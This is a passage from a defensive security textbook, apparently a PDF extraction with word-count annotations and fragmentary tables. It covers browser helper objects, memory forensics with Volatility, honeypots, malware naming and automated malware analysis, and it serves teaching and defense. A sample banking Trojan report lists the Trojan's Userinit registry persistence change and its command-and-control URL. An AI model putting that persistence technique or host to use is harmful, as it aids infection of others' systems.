face to list all add-ons currently used by the browser. To access this 
list in Internet Explorer 6, choose Manage Add-ons from the Tools
[Word Count: 34]

Exhibit 4-36  A Trojan BHO modifies the normal logon (left) to include additional fields (right).
[Word Count: 15]

menu; in Internet Explorer 7, choose Manage Add-ons from the Tools 
menu and then select Enable or Disable Add-ons.
[Word Count: 19]

The add-ons list shows all BHOs and their cousins (ActiveX 
Controls and Toolbars) currently used by Internet Explorer. From this 
dialog, users can also disable specific controls. Exhibit 4-37 shows the 
Manage Add-ons interface with a list of plug-ins installed.
[Word Count: 40]

BHOs allow developers to extend Internet Explorer and provide 
new functionality that benefits users, but this flexibility comes at a 
cost. The increased attack surface can leave “fully patched” Windows 
systems vulnerable if every BHO has not also been updated to the lat-
est version. BHOs also provide an easy way for attackers to manipulate
[Word Count: 55]

Exhibit 4-37  A manage add-ons dialog showing currently loaded add-ons.
[Word Count: 10]

the browser to steal data from unsuspecting users. Administrators 
should know every BHO installed on the systems they manage to 
ensure that each of them is included in patching cycles and that no 
malicious BHOs have been installed.
[Word Count: 38]

1.	 Eugene Spafford, “The Internet Worm Program: An Analysis,” Purdue
[Word Count: 10]

University, December 8, 1988, http://spaf.cerias.purdue.edu/tech-
reps/823.pdf.
	
2.	 Robert Lemos, “In Less than Six Hours Thursday, Love Spread
[Word Count: 17]

Worldwide,” ZDNet, May 5, 2000, http://news.zdnet.com/2100-
9595_22-107344.html.
	
3.	 Joris Evers, “Microsoft Pulls WindowsUpdate.com to Avert Blaster,”
[Word Count: 16]

ComputerWorld, August 15, 2009, http://www.computerworld.com/s/
article/84077/Microsoft_pulls_WindowsUpdate.com_to_avert_Blaster.
	
4.	 Noah Schachtman, “Under Worm Assault, Military Bans Disks,
[Word Count: 15]

USB Drives,” Wired, November 19, 2008, http://www.wired.com/
dangerroom/2008/11/army-bans-usb-d/.
	
5.	 Microsoft, “Update to the AutoPlay Functionality in Windows,” August
[Word Count: 18]

25, 2009, http://support.microsoft.com/kb/971029.
	
6.	 Fortinet, “Fortinet Investigates a New SMS Mobile Worm: Yxes.A,”
[Word Count: 13]

February 18, 2009, http://www.fortiguard.com/advisory/FGA-2009-07.
html. 
	
7.	 iDefense, “Out of the Lab: Reverse Engineering Koobface,” ID# 531201,
[Word Count: 16]

October 14, 2009.
	
8.	 iDefense, “Conficker/Downadup Worm Summary,” ID# 484574, March
[Word Count: 11]

20, 2009.
	
9.	 F-Secure, “Virus: Boot/Brain,” 2009, http://www.f-secure.com/v-descs/
[Word Count: 8]

brain.shtml.
	 10.	 Rott_En, “Virus Payloads: History and Payload Mentality,” New Order,
[Word Count: 11]

December 30, 2004, http://neworder.box.sk/newsread.php?newsid=12531.
	 11.	 Spam Laws, “Understanding the Resident Virus,” 2009, http://www.
[Word Count: 13]

spamlaws.com/resident-virus.html.
	 12.	 Piotr Krysiuk, “W32.Xpaj.B: An Upper Crust File Infector,” Symantec,
[Word Count: 11]

September 
30, 
2009, 
http://www.symantec.com/connect/blogs/
w32xpajb-upper-crust-file-infector. 
	 13.	 iDefense, “State of the Hack: iDefense Explains … Symmetric
[Word Count: 15]

Encryption,” ID# 487598, June 29, 2009.
	 14.	 Panda Security, “Xor-encoded.A,” Panda Security Encyclopedia, June 2,
[Word Count: 15]

2009, 
http://www.pandasecurity.com/enterprise/security-info/194318/
Xor-encoded.A/.
	 15.	 Péter Ször and Peter Ferrie, “Hunting for Metamorphic,” Symantec,
[Word Count: 13]

October 27, 2009, http://www.symantec.com/avcenter/reference/hunt-
ing.for.metamorphic.pdf.
[Word Count: 5]

16.	 Nicolas Brulez, “Parasitic Infector Analysis II: What Changed?” Websense
[Word Count: 10]

Security Lab Blog, February 29, 2009, http://securitylabs.websense.com/
content/Blogs/3300.aspx.
	 17.	 Zend, “Zend Guard: Protect Your Application with PHP Encoder,”
[Word Count: 18]

2009, http://www.zend.com/en/products/guard/.
	 18.	 Jeek.org, “Jsunpack: A Generic JavaScript Unpacker,” n.d., http://jsun­
[Word Count: 11]

pack.jeek.org/dec/go.
	 19.	 iDefense, “State of the Hack: iDefense Explains … Obfuscation,” iDe­
[Word Count: 12]

fense Weekly Threat Report, ID# 486145, May 18, 2009.
	 20.	 VMProtect Software, “What Is VMProtect?” 2006–2010, http://vmpro­
[Word Count: 17]

tect.ru.
	 21.	 iDefense, Malicious Code Summary Report, ID# 472002, August 27,
[Word Count: 11]

2008.
	 22.	 Joanna Rutkowska, “Introducing Blue Pill,” Invisible Things Lab’s Blog,
[Word Count: 11]

June 22, 2006, http://theinvisiblethings.blogspot.com/2006/06/introduc­
ing-blue-pill.html.
	 23.	 Gladiator Security Forum, “A Collection of Autostart Locations,” March 28,
[Word Count: 16]

2005, http://gladiator-antivirus.com/forum/index.php?showtopic=24610.
	 24.	 GMER, “Start,” 2004–2010, http://www.gmer.net/index.php.
	 25.	 Mark Russinovich and Bryce Cogswell, “Autoruns for Windows v10.01,”
[Word Count: 17]

Windows Systernals, June 15, 2010, http://technet.microsoft.com/en-us/
sysinternals/bb963902.aspx.
	 26.	 Trend Micro, “HijackThis: Version 2.0.4,” 1989–2010, http://www.trend­
[Word Count: 15]

secure.com/portal/en-US/tools/security_tools/hijackthis.
	 27.	 Greg Hoglund and James Butler, Rootkits: Subverting the Windows Kernel
[Word Count: 12]

(Reading, Mass.: Addison-Wesley, 2005).
	 28.	 iDefense, “State of the Hack: Persistent Software Techniques,” iDefense
[Word Count: 14]

Weekly Threat Report, ID# 483561, February 23, 2009.
	 29.	 iDefense, “State of the Hack: iDefense Explains ... Form Grabbing,” iDe­
[Word Count: 20]

fense Weekly Threat Report, ID# 485156, April 13, 2009.
	 30.	 iDefense, “State of the Hack: iDefense Explains … Click Fraud,” iDe­
[Word Count: 21]

fense Weekly Threat Report, ID# 522507, September 28, 2009.
	 31.	 iDefense, Malicious Code Summary Report, ID# 479408, December 24,
[Word Count: 19]

2008.
	 32.	 securiteam, http://www.securiteam.com/exploits/60ooc1PMUE.ht.
	 33.	 Bojan Zdrnja, “When Web Application Security, Microsoft and the AV
[Word Count: 15]

Vendors All Fail,” Internet Storm Center, March 13, 2009, http://isc.
sans.org/diary.html?storyid=6010.
	 34.	 Tobias Klein, “TrapKit,” 2000–2010, http://www.trapkit.de.
	 35.	 Code Project, “Detect if Your Program Is Running inside a Virtual
[Word Count: 29]

Machine,” April 4, 2005, http://www.codeproject.com/KB/system/
VmDetect.aspx.
	 36.	 eEye Digital Security, “Another VMWare Detection,” Research Blog,
[Word Count: 15]

September 19, 2006, http://eeyeresearch.typepad.com/blog/2006/09/
another_vmware_.html.
	 37.	 For more information on BHOs, refer to iDefense, “State of the Hack,”
[Word Count: 18]

iDefense Weekly Threat Report, ID# 484802, March 2, 2009.
[Word Count: 9]

38.	 For more information on how to create IDS signatures for these Trojans,
[Word Count: 13]

refer to the iDefense Topical Research Report: Tracking and Detecting 
Trojan Command and Control Servers. (ID# 472109).
	 39.	 Paul Oliveria, “Targeted Attack in Mexico: DNS Poisoning via Modems,”
[Word Count: 28]

Trend Micro, January 11, 2008, http://blog.trendmicro.com/targeted-
attack-in-mexico-dns-poisoning-via-modems/.
	 40.	 iDefense, “State of the Hack: iDefense Explains … Browser Helper
[Word Count: 18]

Objects,” iDefense Weekly Threat Report, ID# 484040, March 2, 2009.
[Word Count: 10]

267
© 2011 by Taylor & Francis Group, LLC
[Word Count: 9]

Memory forensics refers to finding and extracting forensic artifacts 
from a computer’s physical memory. This section explains the impor­
tance and capabilities of memory forensics and the tools used to sup­
port incident response and malware analysis.
[Word Count: 37]

5.1.1  Why Memory Forensics Is Important
[Word Count: 6]

Analysts who bring memory forensics skills to an investigation are 
better equipped to handle malware incidents than analysts who do 
not have such skills. Here are a few reasons why:
[Word Count: 30]

•	 Attackers design some malware to run completely from RAM
[Word Count: 10]

(i.e., memory resident codes) to avoid touching longer term
[Word Count: 9]

storage devices such as the hard drive. Therefore, if analysts 
do not look for signs of intrusions in RAM, they might miss 
the most important, or perhaps the only, evidence that mal­
ware existed on the system.
•	 Attackers design some malware to hide its own code and the
[Word Count: 49]

resources that it requires from the operating system using 
application program interface (API) hooks; however, these 
rootkit techniques typically only work against other processes 
on the infected computer while the system is running. Hiding 
from offline memory forensics tools requires a different set of 
capabilities that most malware authors have not implemented 
into their code.
•	 Similar to what Isaac Newton theorized about the real world,
[Word Count: 66]

every action on a computer has a reaction. Even if attackers were 
able to study the Windows operating system (OS) well enough 
to anticipate the side effects of every API call, they would not 
be able to prevent or hide each side effect continuously and 
perpetually. If investigators become familiar with these side 
effects, they can use the information as clues when determin­
ing what might have happened on the suspect system.
[Word Count: 72]

Analysts can gather an extreme amount of information about the state 
of a system by using memory forensics. Table 5-1 shows a few of the 
default capabilities of a memory analysis framework and the corre-
sponding tools that one might use on a live system to gather the same 
type of evidence.
[Word Count: 52]

Based on the information in Table 5-1, memory forensics frame-
works can produce the same information that 10–20 standard tools 
that analysts frequently use on live systems can, but with the added 
benefit of being able to bypass rootkit tricks.
[Word Count: 40]

In terms of memory analysis frameworks, there are a few options 
from which to choose. The most important factors are cost, the pro-
gramming language for developing plug-ins for the frameworks, the
[Word Count: 32]

operating systems on which the frameworks run, and the reliability of 
the frameworks’ output. See Table 5-2.
[Word Count: 17]

Because Volatility is free, is written in Python, and runs on mul-
tiple operating systems, it is the favorite framework of many iDefense 
engineers. Knowing how tools work, rather than just knowing how to 
use the tools, is a requirement to analyzing and understanding today’s 
sophisticated malware. Volatility is open-source Python, so learning 
how Volatility harvests information is simple. In fact, one of the ways 
that iDefense engineers learned a lot about the technical aspects of 
memory analysis, including the format of kernel structures and how
[Word Count: 86]

Table 5-1  Default Capabilities and Corresponding Tools
[Word Count: 7]

Determine which processes and threads were active at the time
[Word Count: 10]

an analyst obtained the memory dump, including the process 
ID, thread ID, and process start and end times.
[Word Count: 18]

Enumerate the dynamic link libraries (DLLs) loaded in any
[Word Count: 9]

process, including their base address in virtual memory, the size 
of the DLL, and the full path to the DLL on disk.
[Word Count: 22]

Determine which ports and protocols are in use, the local and
[Word Count: 11]

remote Internet Protocol (IP) endpoints, and the process 
identifier (PID) of the process responsible for creating the 
connection or socket.
[Word Count: 20]

Determine which kernel modules are loaded, including their
[Word Count: 8]

Dump malicious process executables, DLLs, kernel drivers, and
[Word Count: 8]

any nonpaged memory ranges in user mode or kernel mode 
memory for further inspection.
[Word Count: 14]

Print the addresses and sizes of all allocated memory regions in
[Word Count: 11]

a process, including the page permissions and whether the 
region contains a memory-mapped file.
[Word Count: 14]

Determine which files and registry keys were open in a process
[Word Count: 11]

Table 5-2  Memory Analysis Framework Factors
[Word Count: 6]

Volatilitya
Free and open source
Python
Windows, Linux, and OSX
HBGary Responderb
$1,500–9,000
C#
Windows only
Mandiant Memoryzec
Free and closed source
XML and proprietary
Windows only
[Word Count: 27]

Source:	 a: Volatile Systems, “Volatility Website,” 2006–2008, https://www.volatilesystems.com/
[Word Count: 8]

default/volatility. b: HBGary, “HBGary Responder Tool,” 2009, https://www.hbgary.com/
products-services/responder-prof/; and c: Mandiant, “Free Software: Memoryze,” 2010, 
http://www.mandiant.com/software/memoryze.htm.
[Word Count: 17]

to parse them, was by learning from Volatility’s programmers by look­
ing through the source code.
[Word Count: 16]

To begin using Volatility, download the package from its home page 
on the Volatile Systems3 website or grab a copy of the latest Subversion 
package4 hosted at Google code. The Volatility Documentation 
Project5 by Jamie Levy (a.k.a. gleeda) and a few anonymous authors 
contains some great manuals for installing Volatility on Windows, 
Linux, and OSX. In most cases, to get started, the only requirement 
is to extract the archive and invoke the “volatility” script with Python, 
as shown in the following command sequence:
[Word Count: 83]

$ tar -xvf Volatility-1.3.tar.gz
$ cd Volatility-1.3
$ python volatility
[Word Count: 10]

Volatile Systems Volatility Framework v1.3
	
Copyright (C) 2007,2008 Volatile Systems
	
Copyright (C) 2007 Komoku, Inc.
	
This is free software; see the source for 
copying conditions.
	
There is NO warranty; not even for 
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
[Word Count: 39]

Run command cmd with options cmd_opts
	
For help on a specific command, run ‘volatility 
cmd --help’
[Word Count: 16]

each process
	
sockets 	
Print list of open sockets
	
sockscan 	
Scan for socket objects
	
sockscan2 	
Scan for socket objects (New)
	
strings 	
Match physical offsets to virtual 
addresses (may take a while, VERY 
verbose)
	
thrdscan 	
Scan for ETHREAD objects
[Word Count: 37]

thrdscan2 	
Scan for thread objects (New)
	
vaddump 	
Dump the Vad sections to files
	
vadinfo 	
Dump the VAD info
	
vadwalk 	
Walk the vad tree
[Word Count: 23]

All of the commands shown in the output are available by default. 
Analysts can learn any required arguments for individual commands 
by issuing “python volatility <command> --help”; however, many of 
the commands work without arguments. The full syntax for extract­
ing evidence from the memory dump created with Volatility follows:
[Word Count: 50]

$ python volatility <command> <arguments> -f mem.dmp
[Word Count: 7]

To use Volatility to generate a process listing by walking the linked 
list of processes, use the following syntax:
[Word Count: 19]

Exhibit 5-1  The path used by Volatility to locate the EPROCESS object list.
[Word Count: 13]

spoolsv.exe	
1528	652	
12	
111	 Tue Dec 01 15:58:56 2009
explorer.exe	
1572	1496	 10	
284	 Tue Dec 01 15:58:56 2009
VBoxTray.exe	
1644	1572	 7	
39	
Tue Dec 01 15:58:57 2009
alg.exe	
780	 652	
6	
104	 Tue Dec 01 15:59:07 2009
wscntfy.exe	
696	 1004	 1	
27	
Tue Dec 01 15:59:09 2009
cmd.exe	
984	 1572	 1	
31	
Tue Dec 01 16:05:26 2009
[Word Count: 60]

win32dd.exe	
996	 984	
1	
21	
Tue Dec 01 16:05:42 2009
[Word Count: 10]

Consider the previous analogy of people joining hands and forming 
a circle to depict the doubly linked list depicted in Exhibit 5-1. If one 
person releases both hands to step outside the circle (see Exhibit 5-2), 
the people on the left and right will join hands and close the gap. The
[Word Count: 51]

Exhibit 5-2  An EPROCESS object removed from a doubly linked list.
[Word Count: 11]

disconnected person does not disappear; instead, he or she is now free 
to walk about the room. Counting people using the original method 
will result in one fewer person; however, by changing techniques and 
scanning the entire room using a thermal imaging device, the results 
would be accurate, even if one or more people were no longer standing 
in the circle.
[Word Count: 61]

The Volatility command psscan2 is not exactly a thermal imaging 
device, but it works similarly in theory. Instead of walking the linked 
list of EPROCESS objects like pslist, psscan2 scans linear memory 
for pools with the same attributes (paged versus nonpaged, tag, and 
size) that the kernel uses for EPROCESS objects, and then applies a 
series of sanity checks. This way, psscan2 is able to find EPROCESS 
objects in memory even if a rootkit has unlinked it from the list. The 
same concept applies to finding hidden kernel drivers, sockets, con­
nections, services, and various other kernel objects.
[Word Count: 98]

Volatility Analyst Pack (VAP)7 is a collection of plug-ins designed for 
malware analysis and rootkit detection. Table 5-3 describes the pur­
pose of the plug-ins and their statuses. If the status is “Public,” then 
the plug-in is publicly available. If the status is “By request,” then the 
plug-in is currently only available to iDefense customers upon request 
(BETA mode).
[Word Count: 59]

Memory forensics is a rapidly growing aspect of incident response and 
malware analysis. Its powerful default capabilities can replace 10–20 live 
system tools, not to mention the features provided by third-party plug-
ins such as VAP. Although there are several options, iDefense recom-
mends the free, open-source Volatility framework, which also provides 
an analyst with the opportunity to learn about the operating system.
[Word Count: 63]

Creating an asset to attract malicious activity for monitoring and early 
warning is a well-established activity. Not only do honeypots, isolated
[Word Count: 21]

technical assets configured with a high level of logging, provide valu­
able attack data for analysis, but security analysts also periodically use 
them as decoys that deliberately contain known vulnerabilities. When 
deployed as a distinct network, known as a honeynet, a firewall is 
specially configured to collect and contain network traffic. The place­
ment and configuration of a honeypot largely determine its success, 
and because malicious activity is likely to occur, it is crucial that it be 
isolated from true IT assets and legitimate traffic.
[Word Count: 85]

Network and information security relies on in-depth defenses to 
limit unauthorized access and dissemination of sensitive informa-
tion. These in-depth defenses provide a hardened posture but give no 
insight on vulnerabilities and other weaknesses exploited by attackers
[Word Count: 37]

Table 5-3  Plug-In Statuses and Descriptions
[Word Count: 6]

apihooks
Public
Detects Import Address Table (IAT), Export Address Table (EAT),
[Word Count: 11]

and inline API hooks in user mode processes and kernel drivers.
callbackscan
By request
Scans for callback objects; this can expose rootkits that register
[Word Count: 24]

system-wide notification routines (see notify_routines below).
csrss_pslist
By request
Detects hidden processes with csrss.exe handles and
[Word Count: 16]

CsrRootProcess links.
debugged
By request
Detects debugged processes; this can expose attempts for
[Word Count: 13]

malware to perform self-debugging, which is a common 
antidebugging trick.
desktopobjscan
By request
Links desktop objects with Window stations and owning
[Word Count: 21]

processes; this technique can expose malware that uses 
hidden windows.
driverirp
Public
Detects attempts to hook drivers by printing input–output
[Word Count: 20]

request packet (IRP) function addresses.
idt
Public
Detects attempts to hook the interrupt descriptor table (IDT)
impscan
By request
Scans unpacked user mode processes and kernel drivers for
[Word Count: 28]

imported API functions; this can help rebuild dumped code for 
static analysis.
ldr_modules
Public
Detects unlinked (hidden) DLLs in user mode processes.
malfind2
Public
Detects hidden and injected code.
notify_routines
By request
Detects thread, process, and image load notify routines—a
[Word Count: 40]

technique used by rootkits such as Mebroot, FFsearcher, 
Blackenergy, and Rustock.
orphan_threads
Public
Detects hidden kernel threads and carves out the rootkit code.
svcscan
By request
Detects hidden services by scanning for SERVICE_RECORD
[Word Count: 33]

structures.
windowstations
By request
Scans for Window station objects that can expose rogue terminal
[Word Count: 14]

services and Remote Desktop Protocol (RDP) sessions.
[Word Count: 7]

in the wild. This lack of visibility requires a reactive approach to a 
security incident, which is a norm within the IT security field as a 
whole. An ideal approach involves proactive measures using knowl­
edge and information of upcoming vulnerabilities, malicious code, 
and attackers to build up defenses prior to an incident. One method of 
obtaining the necessary data to create safeguards requires sacrificing a 
specially configured system, known as a honeypot, to lure in malicious 
activity for analysis.
[Word Count: 80]

Honeypots fit into two different classifications based on the level 
of system interaction available to the attacker. Low-interaction hon-
eypots emulate vulnerable services and applications to entice inbound 
exploit attempts from attackers. Emulation occurs by mimicking 
real network responses to inbound connections allowing an attack to 
progress to completion. The attacks do not compromise the honey-
pot because the honeypot itself is not vulnerable; rather, it follows 
along by emulating vulnerabilities. Logs of the activity capture the 
exploit attempt, and postattack analysis provides information to pro-
tect other production devices from falling victim to the attack. The
[Word Count: 97]

second type of honeypots, known as high-interaction honeypots, utilize 
actual services and vulnerabilities to attract inbound attacks. The use 
of real services provides detailed information on the steps involved in 
exploitation and the postcompromise activity. This type of honeypot 
requires close and constant observation because the system is likely 
to fall victim to compromise. High-interaction honeypots also need 
extra security measures to contain subsequent attacks or malicious 
code propagation.
[Word Count: 69]

Many commercial and open-source honeypot solutions are avail­
able and vary in intended use. Typically, honeypots act as a decoy to 
lead attacks away from production systems. Specter, a commercial 
honeypot, is an example of a low-interaction honeypot that adver-
tises vulnerabilities and acts as a decoy and data collection solution.9 
A collection of honeypots used to simulate a network of systems, 
known as a honeynet, requires a system called a honeywall to capture 
and analyze the data on the network and contain the risks presented
[Word Count: 86]

by these high-interaction honeypots.10 Exhibit 5-3 shows a honey­
net’s infrastructure, including the honeynet gateway residing in the 
demilitarized zone (DMZ) to expose its vulnerable infrastructure for 
inbound attacks.
[Word Count: 29]

The legality of honeypot deployment is under constant debate and 
generally involves discussions on entrapment, privacy, and liability. 
Entrapment occurs when a law enforcement officer or agent induces 
a person to commit a crime that the person would be unlikely to
[Word Count: 41]

Honeypot
Database Server
Honeypot
E-mail Server
Honeypot
Web Server
Honeyclient
Honeyclient
[Word Count: 11]

running instructions that increase the load on the system results in 
network latency. A common example of this detection method uses 
the dd command to copy an endless amount of data to /dev/null, 
which produces overwhelming amounts of data for the honeypot to 
log. The ping command can check the network latency during the 
heavy load that the dd command invokes.
[Word Count: 61]

Honeypots provide security professionals and network administra­
tors with information on state-of-the-art attack techniques seen in 
the wild. Using this information to implement security safeguards 
strengthens a network’s posture and reduces exposure to threats. 
Proactive responses to threats and attacks are possible with obtained 
information, which makes honeypots valuable tools to help survive 
the malicious nature of the Internet.
[Word Count: 59]

This section clarifies the malicious code–naming conventions within 
the industry, which can be confusing and difficult to reference. The 
differences in procedures used by antivirus tools and those used by ana­
lysts are at the heart of the problem. This section also discusses in depth 
this and other challenges to naming malicious code consistently.
[Word Count: 54]

iDefense analysts usually assign a malicious file a new name when 
nothing previously describes it or when it provides a more valuable
[Word Count: 22]

reference point. Other organizations may have different policies about 
renaming viruses when they create detections for them because it 
prevents the revealing of new hacking tools and techniques to attack­
ers. Similarly, attackers can insert fake authors, tool names, or other 
details to confuse analysts. To determine if a malicious program 
already has a malicious code name, analysts can use online virus-
scanning services such as Virustotal or av-test.org. As an example, 
Exhibit 5-4 displays the results of such a scan showing the detection 
for a typical banking Trojan.17
[Word Count: 89]

AntiVir 
Avast 
AVG 
BitDefender 
ClamAV 
DrWeb 
F-Secure 
GData 
Kaspersky 
McAfee+Artemis 
Microsoft 
NOD32 
Panda 
SecureWeb-Gateway 
Sophos 
TrendMicro 
VBA32
[Word Count: 17]

DR/Delphi.Gen 
Win32:Trojan-gen {Other} 
VB.FTL 
Trojan.AgentMB.CSDN4118442 
Trojan.Downloader-35380 
Trojan.MulDrop.origin 
Suspicious:W32/Malware!Gemini 
Trojan.AgentMB.CSDN4118442 
Trojan.Win32.VB.ieq 
Generic!Artemis 
VirTool:Win32/CeeInject.gen!J 
probably a variant of Win32/Injector.DV 
Suspicious file 
Trojan.Dropper.Delphi.Gen 
Sus/Dropper-R 
WORM_SOBIG.GEN 
Trojan.Win32.VB.ieq
[Word Count: 23]

Exhibit 5-4  An antivirus scan of a typical banking Trojan.
[Word Count: 10]

Antivirus names use many different categories, and they all follow 
the same format:
[Word Count: 13]

Family_Name.Group_Name.Major_Variant.Minor_
Variant[:Modifier]18
[Word Count: 2]

Although this format is common, many antivirus vendors have a lot of 
flexibility when they name a new virus, including the family, group, 
and variant names. Common types include generic or heuristic (heur for 
short) in their names. Administrators should understand the meaning 
of antivirus product naming that they use in their environments by 
referring to naming documentation from vendors.19
[Word Count: 60]

Other virus names may originate through an analyst’s creativity or 
a virus’s circumstances. For instance, the W32/Nuwar@mm threat 
actually originated from e-mails that initially spread using the atten­
tion-grabbing headline “Nuclear War.” Researchers know this threat 
better as “Storm Worm” because it also spread using a different e-mail 
subject line, such as “230 dead as storm batters Europe.” In fact, the 
community disputed the naming of this particular virus as a worm 
because it spreads using massive e-mail campaigns.
[Word Count: 79]

Blackworm
Creates \WINDOWS\system32\About_Blackworm.C.txt
[Word Count: 3]

Nyxem
Target the New York Mercantile Exchange (Nymex)
[Word Count: 8]

My Wife/Kama Sutra
Subjects surrounding the e-mail attacks
[Word Count: 8]

Exhibit 5-5  Virus names and their explanations.
[Word Count: 7]

Different goals and perspectives influence the naming of viruses 
and may encourage researchers to invent new names even when an 
existing name is already available. According to Brian Krebs, Nyxem 
was derived by transposing the letters m and x in Nymex, a shorthand 
term for the New York Mercantile Exchange.20
[Word Count: 50]

Administrators should attempt to understand abbreviations and stan-
dard naming conventions for incidents because it may help them look 
for certain behavior or ask questions; however, dependence on virus 
naming is not reliable or capable of conveying enough information to
[Word Count: 40]

be very useful. Analysts and reverse engineers are still the best sources 
for identifying virus families because of the high variation of names 
assigned to viruses. Extensive research, including reverse engineer­
ing and behavioral analysis, is usually necessary to determine how to 
name a threat accurately.
[Word Count: 46]

5.4  Automated Malicious Code Analysis Systems
[Word Count: 6]

The massive volume of distinct pieces of malicious code in existence 
exceeds the capacity of human analysts. Fortunately, researchers 
can automate much of the initial analysis. This automation allows 
much greater efficiency and prioritization of analysis of malicious 
code samples.
[Word Count: 40]

With attackers producing tens of thousands of new pieces of mali­
cious code every day,23 it is impossible to analyze each sample by 
hand. Behavioral analysis, the process of running an executable in 
a safe environment and monitoring its behavior, is one way to deter­
mine what malicious code does. Automated malicious code analysis 
systems (AMASs) perform this process quickly and efficiently to pro­
duce a report that a human analyst can use to determine what actions 
the malicious code took. In this section we explore the advantages 
and disadvantages of different techniques used by AMASs to analyze 
malicious code.
[Word Count: 100]

In recent years, researchers have built many AMASs that differ 
in capability and analysis techniques but all operate under the same 
principle. To be effective, malicious code has to perform some action 
on the infected system, and monitoring the malicious code’s behav­
ior is a useful way to determine the malicious code’s functionality. 
Behavioral analysis cannot determine everything that malicious code 
is capable of, but it can tell you what malicious code will do under 
certain circumstances. There are two main techniques to analyze the 
behavior of malicious code:
[Word Count: 89]

1.	Passive analysis: Record the state of the system before and
[Word Count: 11]

after the infection. Then, compare these states to determine 
what changed.
	
2.	Active analysis: Actively monitor and record malicious code
[Word Count: 20]

Passive analysis is the hands-off approach to behavioral malicious code 
analysis. All it requires is a computer to infect, some way to capture 
the state of that computer, and a way to restore the system to its origi­
nal state. Passive analysis systems work in the three-stage cycle shown 
in Exhibit 5-6. First, someone installs the operating system and any 
necessary applications on a computer, recording the “clean” state. The 
recorded information includes any features of the system that mali­
cious code might alter, such as the file system and Windows registry.
[Word Count: 92]

Second, the malicious code in question is executed on the system 
for a period of time. The amount of time depends on how quickly the 
analysis must be performed. Two- to three-minute runtimes are com­
mon, as this is normally a sufficient amount of time for the malicious 
code to complete its initial installation.
[Word Count: 54]

After the malicious code infects the system, it must be shut down 
before an external system analyzes its disk and memory to record the 
new “infected” state. An external computer may be used to record the 
infected system’s state to avoid any interference from the malicious 
code. Malicious code often hides files and processes from the user 
using rootkits, but an external system (such as a virtual machine host 
or a system working from a copy of the infected disk) is not suscep-
tible to this interference.
[Word Count: 87]

During the analysis stage, the external system compares the 
infected state to the clean state already recorded. AMASs can make 
comparisons between any features of the system that have a state. 
Common analysis features include the following:
[Word Count: 37]

Exhibit 5-6  An automated malicious code analysis cycle.
[Word Count: 8]

•	 File system
•	 Windows Registry content
•	 Running processes
•	 Listening ports
•	 Memory contents
[Word Count: 16]

In addition to static information about the malicious code (file 
name, size, and MD5), the resulting report might contain the follow-
ing information:
[Word Count: 23]

Exhibit 5-7  A passive analysis comparison process.
[Word Count: 7]

•	 C:\WINDOWS\system32\lowsec\user.ds
•	 C:\WINDOWS\system32\lowsec\local.ds
•	 C:\WINDOWS\system32\sdra64.exe
Registry modifications:
[Word Count: 8]

•	 Key: 
HKLM\software\Microsoft\Windows 
NT\
CurrentVersion\Winlogon
•	 Old 
Value: 
“Userinit”=“C:\\WINDOWS\\system32\\
userinit.exe”
•	 New Value: “Userinit”=“C:\\WINDOWS\\system32\\
[Word Count: 14]

userinit.exe, C:\\WINDOWS\\system32\\sdra64.exe”
[Word Count: 2]

This information shows us that not only did the malicious code create 
three new files but also it altered the Windows Registry so that the 
file sdra64.exe is run when the user logs on to the system.
[Word Count: 37]

Passive analysis systems also frequently include network monitor­
ing, as long as the monitoring system occurs outside of the infected 
system. Network traffic is a key component to many AMASs because 
it includes any external communication the malicious code might 
make and reveals the source of the malicious code’s command-and-
control (C&C) server if one exists. In the mentioned example report, 
analysis of the network traffic revealed that the URL visited was 
http://index683.com/varya/terms.php.
[Word Count: 73]

Knowing that the malicious code visits this particular website is 
very valuable. Security personnel can search proxy logs for any systems 
that visited this site to pinpoint infected systems. Blocking access to 
this URL will also help prevent the malicious code from conducting 
its malicious activity.
[Word Count: 46]

Malicious code cannot typically detect a passive analysis system 
because the system does not interfere with its operation. Malicious code 
can make passive systems ineffective by taking advantage of the sys-
tem’s analysis timeout. If the system only allows the malicious code to 
run for three minutes before recording the infected state, the malicious 
code could simply sleep for four minutes before taking any action.
[Word Count: 65]

While passive analysis is simple, it cannot tell the malicious code’s 
entire story. For instance, if the malicious code creates a temporary file 
while installing its components and then deletes that file before the 
system captures the infected state, the analysis report will not include
[Word Count: 45]

this evidence. Passive monitoring also fails to capture the timeline of 
the infection. The sample report above shows that the malicious code 
creates three files, but it does not show the order in which the mali­
cious code created them. It is possible that the malicious code created 
sdra64.exe first, and that executable created the additional files. To 
capture this information, the system must actively monitor the mali­
cious code.
[Word Count: 70]

Active analysis systems can install their own rootkits that hook 
the APIs that the malicious code will use, allowing it to keep track 
of every API call the program makes. If malicious code can detect 
the AMAS processes, it could simply exit without taking any actions 
that would reveal its functionality. This is the primary disadvantage to 
active systems, but a well-written rootkit can hide its own processes to 
prevent the malicious code from detecting it and altering its behavior.
[Word Count: 80]

Active systems are not vulnerable to the same waiting technique that 
malicious code uses to fool passive systems. An active analysis rootkit 
can hook the sleep()function that malicious code uses to delay execu­
tion and then alter the amount of time the malicious code sleeps to 
just 1 millisecond.
[Word Count: 49]

Active analysis systems also work in a cycle between clean and 
infected states, but do not require a comparison of the clean and 
infected states to perform their analysis. After the malicious code 
completes execution or runs for the maximum time allowed, the sys­
tem records the activity in a report and begins restoring the system to 
the clean state.
[Word Count: 60]

For nonemulated AMASs, both passive and active, analysis time is 
spent in two primary categories. First, time is spent allowing the 
malicious code to execute. If the runtime is too short, the analysis 
might miss a critical step taken by the malicious code, but the more 
time allotted for the malicious code to run, the longer the system 
takes to generate a report. The second major source of analysis time 
is restoring the infected system to a clean state. This must be done to
[Word Count: 84]

prepare the system for the next analysis and makes up a significant 
portion of the analysis time.
[Word Count: 17]

(TRUMAN) system, and iDefense currently uses this method in its 
Malcode Rapid Report Service (ROMAN). This method takes two 
to three minutes per analysis but is undetectable by malicious code 
and ensures that each analysis begins with a known clean image.
[Word Count: 41]

Each system uses a different analysis mechanism and may return 
different results. Submitting files to multiple systems can be ben-
eficial since the combination of the resulting reports may be more
[Word Count: 31]

Exhibit 5-8  A CoreRESTORE ATA/IDE bridge.
[Word Count: 6]

complete than what a single system can produce. Using AMAS is 
an excellent first step during any malicious code investigation, as a 
fully automated analysis can be performed quickly and requires little 
human interaction.
[Word Count: 34]

Network security encompasses any safeguards deployed to increase 
the safety of interconnected systems and the information that tra­
verses the network between these systems. Connecting computers 
allows for communication and the exchange of information, but also 
exposes these computers to threats from remote locations. This expo­
sure to external threats needs a monitoring and detection solution to 
ensure the safety of interconnected systems. In this section, iDefense 
